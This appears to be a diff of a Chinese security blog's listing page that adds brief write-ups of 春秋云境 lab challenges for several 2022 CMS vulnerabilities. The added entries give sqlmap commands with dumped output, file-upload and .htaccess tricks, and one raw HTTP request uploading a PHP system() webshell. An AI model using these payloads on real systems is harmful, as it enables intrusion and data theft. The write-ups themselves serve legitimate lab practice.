@@ -140,7 +140,7 @@
     <header class="article-header">
         
         <h1 itemprop="name">
-            <a href="/2020/12/08/C1CTF2020/">C1CTF 2020-Misc WP</a>
+            <a href="/2023/03/30/CVE-2022-24223/">春秋云境-CVE-2022-24223</a>
         </h1>
         
         <div class="article-meta clearfix">
@@ -148,7 +148,503 @@
     
     <i class="icon-calendar vm"></i>
     
-    <time class="vm" datetime="2020-12-08T02:23:51.000Z" itemprop="datePublished">2020-12-08</time>
+    <time class="vm" datetime="2023-03-30T09:44:38.000Z" itemprop="datePublished">2023-03-30</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>漏洞描述：AtomCMS SQL注入漏洞</p>
+<p>写了半天shell，读了半天文件，这次flag反而在数据库里。</p>
+
+        
+        <p class="article-more-link">
+            <a href="/2023/03/30/CVE-2022-24223/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2023/03/30/CVE-2022-28060/">春秋云境-CVE-2022-28060</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2023-03-30T09:44:22.000Z" itemprop="datePublished">2023-03-30</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>漏洞描述：Victor CMS v1.0 &#x2F;includes&#x2F;login.php 存在sql注入</p>
+<p>使用sqlmap跑，但flag不在数据库中，尝试写入shell失败，路径不对，使用<code>--file-read</code>命令读取服务器的任意文件，这里读取<code>/flag</code>，之后sqlmap会将flag下载到本地</p>
+
+        
+        <p class="article-more-link">
+            <a href="/2023/03/30/CVE-2022-28060/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2023/03/30/CVE-2022-23880/">春秋云境-CVE-2022-23880</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2023-03-30T09:43:56.000Z" itemprop="datePublished">2023-03-30</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>漏洞描述：taoCMS v3.0.2 文件管理处存在任意文件上传漏洞，攻击者可执行任意代码</p>
+<p>为了得到flag的话跟2022-25578的做法一样 改index.php为一句话 蚁剑</p>
+
+        
+        <p class="article-more-link">
+            <a href="/2023/03/30/CVE-2022-23880/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2023/03/30/CVE-2022-25488/">春秋云境-CVE-2022-25488</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2023-03-30T09:43:31.000Z" itemprop="datePublished">2023-03-30</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>漏洞描述：Atom CMS v2.0存在sql注入漏洞在&#x2F;admin&#x2F;ajax&#x2F;avatar.php页面</p>
+<p>sqlmap一把梭 参数是id，直接–os-shell</p>
+
+        
+        <p class="article-more-link">
+            <a href="/2023/03/30/CVE-2022-25488/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2023/03/30/CVE-2022-26965/">春秋云境-CVE-2022-26965</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2023-03-30T09:43:13.000Z" itemprop="datePublished">2023-03-30</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>漏洞描述：Pluck-CMS-Pluck-4.7.16 后台RCE</p>
+<p>进入容器，点击admin，输入密码：admin</p>
+<p>去官网找主题，解压下来将主题的info.php里插入一句话，重新压缩，上传主题，在&#x2F;data&#x2F;themes下访问带有恶意代码的info.php，蚁剑getshell</p>
+
+        
+        <p class="article-more-link">
+            <a href="/2023/03/30/CVE-2022-26965/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2023/03/30/CVE-2022-25578/">春秋云境-CVE-2022-25578</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2023-03-30T09:42:29.000Z" itemprop="datePublished">2023-03-30</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>漏洞描述：taocms v3.0.2允许攻击者通过编辑.htaccess文件执行任意代码</p>
+<p>进入容器，点击管理，用户名密码：admin&#x2F;tao，点击文件管理→.htaccess→编辑→插入payload:<code>AddType application/x-httpd-php .php3</code>，然后建立个新文件写入一句话，但是这里不知道为什么无法新建文件，直接修改index.php的内容为一句话访问，蚁剑getshell</p>
+
+        
+        <p class="article-more-link">
+            <a href="/2023/03/30/CVE-2022-25578/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2023/03/30/CVE-2022-28512/">春秋云境-CVE-2022-28512</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2023-03-30T09:41:42.000Z" itemprop="datePublished">2023-03-30</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>漏洞描述：Fantastic Blog (CMS)是一个绝对出色的博客&#x2F;文章网络内容管理系统。它使您可以轻松地管理您的网站或博客，它为您提供了广泛的功能来定制您的博客以满足您的需求。它具有强大的功能，您无需接触任何代码即可启动并运行您的博客。 该CMS的&#x2F;single.php路径下，id参数存在一个SQL注入漏洞。</p>
+<p>直接访问容器的&#x2F;single.php，sqlmap直接跑</p>
+<p><code>sqlmap -u http://eci-2zea7obo5nr8m0vghlwo.cloudeci1.ichunqiu.com/single.php?id=1 -D ctf -T flag -C flag --dump</code></p>
+
+        
+        <p class="article-more-link">
+            <a href="/2023/03/30/CVE-2022-28512/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2023/03/30/CVE-2022-28525/">春秋云境-CVE-2022-28525</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2023-03-30T09:41:23.000Z" itemprop="datePublished">2023-03-30</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>漏洞描述：ED01-CMS v20180505 存在任意文件上传漏洞</p>
+<p>admin&#x2F;admin登陆，漏洞描述在<code>/admin/users.php?source=edit_user&amp;id=1</code>存在文件上传，访问发现是个编辑用户信息的页面，传一句话图片马抓包，蚁剑getshell</p>
+
+        
+        <p class="article-more-link">
+            <a href="/2023/03/30/CVE-2022-28525/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2023/03/30/CVE-2022-29464/">春秋云境-CVE-2022-29464</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2023-03-30T09:40:39.000Z" itemprop="datePublished">2023-03-30</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>漏洞描述：WSO2文件上传漏洞（CVE-2022-29464）是Orange Tsai发现的WSO2上的严重漏洞。该漏洞是一种未经身份验证的无限制任意文件上传，允许未经身份验证的攻击者通过上传恶意JSP文件在WSO2服务器上获得RCE。</p>
+<p>打开容器，exp直接打，然后访问马地址 cat &#x2F;flag</p>
+
+        
+        <p class="article-more-link">
+            <a href="/2023/03/30/CVE-2022-29464/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2023/03/30/CVE-2022-30887/">春秋云境-CVE-2022-30887</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2023-03-30T09:39:06.000Z" itemprop="datePublished">2023-03-30</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>漏洞描述：多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的, 该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。 该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行。</p>
+<p>exp：<code>https://packetstormsecurity.com/files/166786/Pharmacy-Management-System-1.0-Shell-Upload.html</code></p>
+<p>开启容器，给了一个登陆界面，尝试登陆，发现没有账号，在这卡了有点久。访问<code>/php_action/editProductImage.php</code>回显localhost拒绝了请求，以为需要登录后才可以用，其实不需要，直接访问抓包写入shell就可以了</p>
+<p>报文如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /php_action/editProductImage.php?id=1 HTTP/1.1</span><br><span class="line">Host: eci-2zea7obo5nr8fk1t72p4.cloudeci1.ichunqiu.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; ci_session=0eb1aac78dc3ba42607ab8cf31c270ec25c7b37d; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1663293722,1664166096,1665551946,1665735159; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1665735163; PHPSESSID=e63668ifbfptj7h0nsu0odo64t</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------208935235035266125502673738631</span><br><span class="line">Content-Length: 556</span><br><span class="line"></span><br><span class="line">-----------------------------208935235035266125502673738631</span><br><span class="line">Content-Disposition: form-data; name=&quot;old_image&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------208935235035266125502673738631</span><br><span class="line">Content-Disposition: form-data; name=&quot;productImage&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if($_REQUEST[&#x27;s&#x27;]) &#123;</span><br><span class="line">  system($_REQUEST[&#x27;s&#x27;]);</span><br><span class="line">  &#125; else phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">-----------------------------208935235035266125502673738631</span><br><span class="line">Content-Disposition: form-data; name=&quot;btn&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------208935235035266125502673738631--</span><br></pre></td></tr></table></figure>
+<p>返回<code>Image uploaded successfully&#123;&quot;success&quot;:true,&quot;messages&quot;:&quot;Successfully Updated&quot;&#125;</code>，然后在<code>/assets/myimages/shell.php?s=</code>传s，执行任意代码</p>
+
+        
+        <p class="article-more-link">
+            <a href="/2023/03/30/CVE-2022-30887/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2023/03/30/CVE-2022-32991/">春秋云境-CVE-2022-32991</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2023-03-30T09:05:46.000Z" itemprop="datePublished">2023-03-30</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>漏洞描述：该CMS的welcome.php中存在SQL注入攻击。</p>
+<p>开启环境，随便注册个账号，在第二项的Ip Networking点击Start抓包，保存包信息为1.txt，并使用sqlmap跑</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --dbs ---batch --random-agent -p eid</span><br><span class="line">------------------------------------------------------</span><br><span class="line">web application technology: PHP 7.2.20</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span><br><span class="line">available databases [4]:</span><br><span class="line">[*] ctf</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br></pre></td></tr></table></figure>
+<p>得到了数据库名，继续爆表名、列名、获取字段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt -D ctf --batch --random-agent -p eid</span><br><span class="line">----------------------------------------------------</span><br><span class="line">Database: ctf</span><br><span class="line">[9 tables]</span><br><span class="line">+-----------+</span><br><span class="line">| rank      |</span><br><span class="line">| user      |</span><br><span class="line">| admin     |</span><br><span class="line">| answer    |</span><br><span class="line">| flag      |</span><br><span class="line">| <span class="built_in">history</span>   |</span><br><span class="line">| options   |</span><br><span class="line">| questions |</span><br><span class="line">| quiz      |</span><br><span class="line">+-----------+</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">sqlmap -r 1.txt -D ctf -T flag --columns --batch --random-agent -p eid</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Database: ctf</span><br><span class="line">Table: flag</span><br><span class="line">[1 column]</span><br><span class="line">+--------+---------------+</span><br><span class="line">| Column | Type          |</span><br><span class="line">+--------+---------------+</span><br><span class="line">| flag   | varchar(1024) |</span><br><span class="line">+--------+---------------+</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">sqlmap -r 1.txt -D ctf -T flag -C flag --dump --batch --random-agent -p eid</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">Database: ctf</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| flag                                       |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| flag&#123;b90b289c-0dc7-47c9-b6c8-80a7698873cc&#125; |</span><br><span class="line">+--------------------------------------------+</span><br></pre></td></tr></table></figure>
+<p>漏洞分析：该框架是web based quiz system v1.0的漏洞，在welcome.php页面存在sql注入漏洞，源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (@<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>] == <span class="string">&#x27;quiz&#x27;</span> &amp;&amp; @<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>] == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$eid</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;eid&#x27;</span>];</span><br><span class="line">        <span class="variable">$sn</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>];</span><br><span class="line">        <span class="variable">$total</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line">        <span class="variable">$q</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="string">&quot;SELECT * FROM questions WHERE eid=&#x27;<span class="subst">$eid</span>&#x27; AND sn=&#x27;<span class="subst">$sn</span>&#x27; &quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class = &quot;panel&quot; style= &quot;margin:5%&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$q</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$qns</span> = <span class="variable">$row</span>[<span class="string">&#x27;qns&#x27;</span>];</span><br><span class="line">            <span class="variable">$qid</span> = <span class="variable">$row</span>[<span class="string">&#x27;qid&#x27;</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;b&gt;Question &amp;nbsp;&#x27;</span>.<span class="variable">$sn</span>.<span class="string">&#x27;&amp;nbsp;::&lt;br /&gt;&lt;br /&gt;&#x27;</span>.<span class="variable">$qns</span>.<span class="string">&#x27;&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>eid可控，构造sql语句传入到mysqli_query即可达成sql注入</p>
+
+        
+        <p class="article-more-link">
+            <a href="/2023/03/30/CVE-2022-32991/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2021/05/06/cstc2021/">2021第六届全国网络空间安全大赛 misc wp</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2021-05-06T04:13:38.000Z" itemprop="datePublished">2021-05-06</time>
 </a>
 
             
@@ -166,7 +662,7 @@
         <p>…</p>
         
         <p class="article-more-link">
-            <a href="/2020/12/08/C1CTF2020/#more">
+            <a href="/2021/05/06/cstc2021/#more">
                 <span class="vm">阅读更多</span>
                 <i class="icon-arrow-double-right vm"></i>    
             </a>
@@ -182,7 +678,7 @@
     <header class="article-header">
         
         <h1 itemprop="name">
-            <a href="/2020/12/07/HECTF2020/">HECTF 2020 MISC WP</a>
+            <a href="/2021/03/17/VNCTF2021/">V&amp;N CTF2021 misc 简要复现</a>
         </h1>
         
         <div class="article-meta clearfix">
@@ -190,7 +686,7 @@
     
     <i class="icon-calendar vm"></i>
     
-    <time class="vm" datetime="2020-12-07T04:03:34.000Z" itemprop="datePublished">2020-12-07</time>
+    <time class="vm" datetime="2021-03-17T06:19:41.000Z" itemprop="datePublished">2021-03-17</time>
 </a>
 
             
@@ -208,7 +704,7 @@
         <p>…</p>
         
         <p class="article-more-link">
-            <a href="/2020/12/07/HECTF2020/#more">
+            <a href="/2021/03/17/VNCTF2021/#more">
                 <span class="vm">阅读更多</span>
                 <i class="icon-arrow-double-right vm"></i>    
             </a>
@@ -224,7 +720,7 @@
     <header class="article-header">
         
         <h1 itemprop="name">
-            <a href="/2020/11/23/NCTF2020/">NCTF2020-misc wp</a>
+            <a href="/2021/03/14/ACTF2021/">ACTF2021Misc 复现&amp;wp</a>
         </h1>
         
         <div class="article-meta clearfix">
@@ -232,7 +728,7 @@
     
     <i class="icon-calendar vm"></i>
     
-    <time class="vm" datetime="2020-11-23T13:07:08.000Z" itemprop="datePublished">2020-11-23</time>
+    <time class="vm" datetime="2021-03-14T07:09:49.000Z" itemprop="datePublished">2021-03-14</time>
 </a>
 
             
@@ -250,7 +746,7 @@
         <p>…</p>
         
         <p class="article-more-link">
-            <a href="/2020/11/23/NCTF2020/#more">
+            <a href="/2021/03/14/ACTF2021/#more">
                 <span class="vm">阅读更多</span>
                 <i class="icon-arrow-double-right vm"></i>    
             </a>
@@ -266,7 +762,7 @@
     <header class="article-header">
         
         <h1 itemprop="name">
-            <a href="/2020/11/23/atFgXsbYK/">misc一些环境的配置问题</a>
+            <a href="/2021/03/12/Reverse/">0基础的Re基操</a>
         </h1>
         
         <div class="article-meta clearfix">
@@ -274,7 +770,7 @@
     
     <i class="icon-calendar vm"></i>
     
-    <time class="vm" datetime="2020-11-23T06:54:06.000Z" itemprop="datePublished">2020-11-23</time>
+    <time class="vm" datetime="2021-03-12T14:00:30.000Z" itemprop="datePublished">2021-03-12</time>
 </a>
 
             
@@ -292,428 +788,7 @@
         <p>…</p>
         
         <p class="article-more-link">
-            <a href="/2020/11/23/atFgXsbYK/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2020/11/23/discmanage/">硬盘管理</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2020-11-23T06:44:23.000Z" itemprop="datePublished">2020-11-23</time>
-</a>
-
-            
-<div class="article-tag-list">
-    <i class="icon-tag vm"></i>
-    <a class="article-tag-link" href="/tags/%E6%8A%80%E6%9C%AF%E5%8A%9B/" rel="tag">技术力</a>
-</div>
-
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>…</p>
-        
-        <p class="article-more-link">
-            <a href="/2020/11/23/discmanage/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2020/11/23/motherboard/">主板的探讨</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2020-11-23T06:41:46.000Z" itemprop="datePublished">2020-11-23</time>
-</a>
-
-            
-<div class="article-tag-list">
-    <i class="icon-tag vm"></i>
-    <a class="article-tag-link" href="/tags/%E6%8A%80%E6%9C%AF%E5%8A%9B/" rel="tag">技术力</a>, <a class="article-tag-link" href="/tags/%E7%A1%AC%E4%BB%B6/" rel="tag">硬件</a>
-</div>
-
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>…</p>
-        
-        <p class="article-more-link">
-            <a href="/2020/11/23/motherboard/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2020/11/22/Python/">Python类库学习-Pillow</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2020-11-22T13:47:29.000Z" itemprop="datePublished">2020-11-22</time>
-</a>
-
-            
-<div class="article-tag-list">
-    <i class="icon-tag vm"></i>
-    <a class="article-tag-link" href="/tags/Python%E5%AD%A6%E4%B9%A0/" rel="tag">Python学习</a>, <a class="article-tag-link" href="/tags/%E6%8A%80%E6%9C%AF%E5%8A%9B/" rel="tag">技术力</a>
-</div>
-
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>…</p>
-        
-        <p class="article-more-link">
-            <a href="/2020/11/22/Python/#more">
-                <span class="vm">阅读更多</span>
